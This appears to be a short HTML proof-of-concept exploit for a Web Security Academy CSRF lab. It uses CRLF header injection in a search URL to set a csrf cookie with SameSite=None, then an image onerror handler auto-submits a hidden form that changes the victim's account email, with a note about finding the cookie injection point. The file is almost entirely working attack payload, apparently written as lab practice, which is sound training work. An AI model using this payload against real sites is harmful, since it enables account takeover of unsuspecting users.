<html>
<body>
    <form action="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacktube@tube.net"/>
        <input type="hidden" name="csrf" value="abcd"/>
    </form>
    <script>
    <img src="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()"/>
    </script>
</body>
</html>?
/*

find a injection point for csrf cookie

*/